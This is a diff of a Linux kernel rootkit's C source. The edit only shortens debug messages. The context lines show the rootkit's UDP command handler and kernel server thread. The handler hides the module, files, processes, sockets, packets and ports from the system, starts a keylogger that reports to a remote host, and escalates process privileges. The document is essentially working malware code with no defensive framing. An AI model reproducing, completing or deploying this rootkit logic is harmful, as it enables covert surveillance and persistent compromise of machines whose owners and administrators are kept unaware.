@@ -61,28 +61,28 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 
 	if(!strncmp(command, CMD_HIDE_MODULE, strlen(CMD_HIDE_MODULE))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_HIDE_MODULE);
+		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_MODULE);
 
 		module_hide();
 	}
 
 	if(!strncmp(command, CMD_SHOW_MODULE, strlen(CMD_SHOW_MODULE))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_SHOW_MODULE);
+		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_MODULE);
 
 		module_unhide();
 	}
 
 	if(!strncmp(command, CMD_HIDE_FILE, strlen(CMD_HIDE_FILE))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_HIDE_FILE);
+		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_FILE);
 
 		file_hide();
 	}
 
 	if(!strncmp(command, CMD_SHOW_FILE, strlen(CMD_SHOW_FILE))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_SHOW_FILE);
+		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_FILE);
 		
 		file_unhide();
 	}
@@ -98,7 +98,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* check for correct number */
 		retrieve_num(cmdparams, command + strlen(CMD_HIDE_PROCESS) + 1, PID_MAX_DIGIT - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_HIDE_PROCESS);
+		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_PROCESS);
 
 		/* hide process */
 		process_hide(strtoint(cmdparams));
@@ -115,7 +115,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* check for correct number */
 		retrieve_num(cmdparams, command + strlen(CMD_SHOW_PROCESS) + 1, PID_MAX_DIGIT);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_SHOW_PROCESS);
+		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_PROCESS);
 
 		/* unhide process */
 		process_unhide(strtoint(cmdparams));
@@ -123,7 +123,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 
 	if(!strncmp(command, CMD_POP_PROCESS, strlen(CMD_POP_PROCESS))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_POP_PROCESS);
+		debug("RUNNING COMMAND \"%s\"", CMD_POP_PROCESS);
 
 		process_pop();
 	}
@@ -138,7 +138,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* check for correct number */
 		strncpy(cmdparams, command + strlen(CMD_HIDE_SOCKET) + 1, PR0TCL_LENGTH + SOC_MAX_DIGIT - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_HIDE_SOCKET);
+		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_SOCKET);
 
 		/* hide socket */
 		socket_hide(retrieve_protocol(cmdparams), retrieve_port(cmdparams));
@@ -154,7 +154,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* check for correct number */
 		strncpy(cmdparams, command + strlen(CMD_SHOW_SOCKET) + 1, PR0TCL_LENGTH + SOC_MAX_DIGIT - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_SHOW_SOCKET);
+		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_SOCKET);
 
 		/* unhide socket */
 		socket_unhide(retrieve_protocol(cmdparams), retrieve_port(cmdparams));
@@ -170,7 +170,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* check for correct number */
 		strncpy(cmdparams, command + strlen(CMD_HIDE_PACKET) + 1, PR0TCL_LENGTH + IP_MAX_LENGTH - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_HIDE_PACKET);
+		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_PACKET);
 
 		/* hide socket */
 		packet_hide(retrieve_protocol(cmdparams), cmdparams + 5);
@@ -186,7 +186,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* check for correct number */
 		strncpy(cmdparams, command + strlen(CMD_SHOW_PACKET) + 1, PR0TCL_LENGTH + IP_MAX_LENGTH - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_SHOW_PACKET);
+		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_PACKET);
 
 		/* unhide socket */
 		packet_unhide(retrieve_protocol(cmdparams), cmdparams + 5);
@@ -200,7 +200,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* copy port from string */
 		retrieve_num(cmdparams, command + strlen(CMD_HIDE_PROCESS) + 1, LOPORT_LENGTH - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_HIDE_PORT);
+		debug("RUNNING COMMAND \"%s\"", CMD_HIDE_PORT);
 
 		/* hide process */
 		port_hide(strtoint(cmdparams));
@@ -214,7 +214,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* copy port from string */
 		retrieve_num(cmdparams, command + strlen(CMD_SHOW_PROCESS) + 1, LOPORT_LENGTH - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_SHOW_PORT);
+		debug("RUNNING COMMAND \"%s\"", CMD_SHOW_PORT);
 
 		/* hide process */
 		port_unhide(strtoint(cmdparams));
@@ -222,14 +222,14 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 
 	if(!strncmp(command, CMD_INIT_KEYLOGGER, strlen(CMD_INIT_KEYLOGGER))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_INIT_KEYLOGGER);
+		debug("RUNNING COMMAND \"%s\"", CMD_INIT_KEYLOGGER);
 
 		insert_host(addr);
 	}
 
 	if(!strncmp(command, CMD_EXIT_KEYLOGGER, strlen(CMD_EXIT_KEYLOGGER))) {
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_EXIT_KEYLOGGER);
+		debug("RUNNING COMMAND \"%s\"", CMD_EXIT_KEYLOGGER);
 
 		remove_host(addr);
 	}
@@ -242,7 +242,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* copy port from string */
 		retrieve_num(cmdparams, command + strlen(CMD_PROC_ESCALATE) + 1, PID_MAX_DIGIT - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_PROC_ESCALATE);
+		debug("RUNNING COMMAND \"%s\"", CMD_PROC_ESCALATE);
 
 		/* hide process */
 		process_escalate(strtoint(cmdparams));
@@ -256,7 +256,7 @@ void cmd_run(const char *command, struct sockaddr_in *addr) {
 		/* copy port from string */
 		retrieve_num(cmdparams, command + strlen(CMD_PROC_DEESCALATE) + 1, PID_MAX_DIGIT - 1);
 
-		debug("[ cmd_run ] RUNNING COMMAND \"%s\"", CMD_PROC_DEESCALATE);
+		debug("RUNNING COMMAND \"%s\"", CMD_PROC_DEESCALATE);
 
 		/* hide process */
 		process_deescalate(strtoint(cmdparams));
@@ -285,7 +285,7 @@ int udp_server_send(struct socket *sock, struct sockaddr_in *addr, unsigned char
 
 	iov_iter_init(&msghdr.msg_iter, WRITE, &iov, 1, len);
 
-	debug("[ udp_server_send ] SEND UDP PACKET TO REMOTE SERVER %pI4", &addr->sin_addr.s_addr);
+	debug("SEND UDP PACKET TO REMOTE SERVER %pI4", &addr->sin_addr.s_addr);
 
 	size = sock_sendmsg(sock, &msghdr);
 
@@ -315,7 +315,7 @@ int udp_server_receive(struct socket* sock, struct sockaddr_in* addr, unsigned c
 
 	iov_iter_init(&msghdr.msg_iter, READ, &iov, 1, len);
 
-	debug("[ udp_server_receive ] RECEIVE UDP PACKET FROM REMOTE SERVER %pI4", &addr->sin_addr.s_addr);
+	debug("RECEIVE UDP PACKET FROM REMOTE SERVER %pI4", &addr->sin_addr.s_addr);
 
     size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
 
@@ -330,11 +330,11 @@ int udp_server_run(void *data) {
     kthread->running = 1;
     current->flags |= PF_NOFREEZE;
 
-    debug("[ udp_server_run ] CREATE UDP SERVER SOCKET");
+    debug("CREATE UDP SERVER SOCKET");
 
     if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0) {
 
-    	debug("[ udp_server_run ] ERROR IN SOCK_CREATE");
+    	debug("ERROR IN SOCK_CREATE");
 
 		/* could net create socket */
 		kthread->thread = NULL;
@@ -343,18 +343,18 @@ int udp_server_run(void *data) {
 		return 0;
     }
 
-    debug("[ udp_server_run ] SUCCESSFULLY CREATED UDP SERVER SOCKET");
+    debug("SUCCESSFULLY CREATED UDP SERVER SOCKET");
 
     memset(&kthread->addr, 0, sizeof(struct sockaddr));
     kthread->addr.sin_family = AF_INET;
     kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
     kthread->addr.sin_port = htons(UDP_PORT);
 
-    debug("[ udp_server_run ] SET ADDRESS FAMILY AND PORT FOR UDP SERVER");
+    debug("SET ADDRESS FAMILY AND PORT FOR UDP SERVER");
 
     if(kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr, sizeof(struct sockaddr)) < 0) {
 
-    	debug("[ udp_server_run ] ERROR IN BIND");
+    	debug("ERROR IN BIND");
 
 		/* could not bind to socket */
 		sock_release(kthread->sock);
@@ -365,7 +365,7 @@ int udp_server_run(void *data) {
 		return 0;
     }
 
-    debug("[ udp_server_run ] RUN UDP SERVER LOOP");
+    debug("RUN UDP SERVER LOOP");
 
 	while(1) {
 
@@ -398,7 +398,7 @@ int udp_server_start(void) {
 	kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
     kthread->thread = kthread_run(&udp_server_run, NULL, "rootkit_udp");
 
-    debug("[ udp_server_start ] INITIALIZING UDP SERVER");
+    debug("INITIALIZING UDP SERVER");
 
     /* error handling */
     if(kthread->thread == NULL) {
@@ -419,7 +419,7 @@ void udp_server_close(void) {
     struct pid *pid = find_get_pid(kthread->thread->pid);
     struct task_struct *task = pid_task(pid, PIDTYPE_PID);
 
-    debug("[ udp_server_close ] EXIT UDP SERVER");
+    debug("EXIT UDP SERVER");
 
     /* kill kthread */
     if (kthread->thread != NULL) {
